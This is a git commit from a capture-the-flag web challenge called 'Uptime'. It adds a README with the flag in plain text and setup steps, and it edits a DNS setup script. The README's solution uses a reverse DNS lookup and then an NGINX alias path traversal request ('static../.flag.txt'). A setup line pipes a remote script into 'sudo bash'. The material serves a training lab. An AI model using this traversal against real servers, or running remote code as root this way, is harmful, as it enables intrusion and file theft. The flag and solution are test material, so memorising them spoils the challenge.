679f6e65b19bcbb26a5ed0252a07c86a212f0a96
vidhun k <vidhunedl@gmail.com>
2020-09-29 22:37:02 +0530

    final changes

---
+++ Readme.md
@@ -0,0 +1,25 @@
+# Uptime
+
+> Difficulty: Medium </br> 
+> Category: Web </br>
+> FLAG: **YASCON{ReverseDnsLookup-d7ad0997540209cbe09e7db4ab4ceb2f}** </br>
+
+## Setup
+
+```bash
+$ curl -Ls https://git.io/JUFEA | sudo bash # turning off default DNS Listener
+Web-challenge $ bash setupdns.sh -c
+Web-challenge $ docker-compose up -d
+```
+
+## Challenge PoC
+
+> Reverse DNS Lookup  --> NGINX Alias Path Traversal via Misconfiguration
+
+```bash
+$ dig @public-ip -x public-ip # get PTR
+$ echo "uptime-dash.yascon.local public-ip" >> /etc/hosts
+$ curl http://uptime-dash.yascon.local 
+$ curl --path-as-is http://uptime-dash.yascon.local/static../.flag.txt # FLAG!!!
+```
+<!-- v1dhun 29/09/2020 -->
--- setupdns.sh
+++ setupdns.sh
@@ -1,14 +1,14 @@
 #!/bin/bash
 
-
 create(){
 IP=$(curl ipinfo.io -s | head -n2 | tail -n1 | awk '{ print $2}' | sed 's/"//g' | sed 's/,//g')
-echo "[+]Public ip : $IP" 
-flag=0;
+echo "[+]Public ip : $IP"
 IFS='.' read -ra ADDR <<< "$IP"
-echo  "[+]setting json file as ${ADDR[2]}.${ADDR[1]}.${ADDR[0]}.in-addr.arpa.json"
+echo  "[+]Setting json file as ${ADDR[2]}.${ADDR[1]}.${ADDR[0]}.in-addr.arpa.json"
 cp dns/216.184.93.in-addr.arpa.json backup/216.184.93.in-addr.arpa.json.bk 
-sed "s/216.184.93.IN-ADDR.ARPA/${ADDR[2]}.${ADDR[1]}.${ADDR[0]}.IN-ADDR.ARPA/"  dns/216.184.93.in-addr.arpa.json > "dns/${ADDR[2]}.${ADDR[1]}.${ADDR[0]}.in-addr.arpa.json"
+sed "s/216.184.93.IN-ADDR.ARPA/${ADDR[2]}.${ADDR[1]}.${ADDR[0]}.IN-ADDR.ARPA/"  dns/216.184.93.in-addr.arpa.json > "dns/.${ADDR[2]}.${ADDR[1]}.${ADDR[0]}.in-addr.arpa.json"
+sed "s/\"6\"/\"${ADDR[3]}\"/" dns/.${ADDR[2]}.${ADDR[1]}.${ADDR[0]}.in-addr.arpa.json > "dns/${ADDR[2]}.${ADDR[1]}.${ADDR[0]}.in-addr.arpa.json"
+rm dns/.${ADDR[2]}.${ADDR[1]}.${ADDR[0]}.in-addr.arpa.json 
 rm dns/216.184.93.in-addr.arpa.json
 }
 
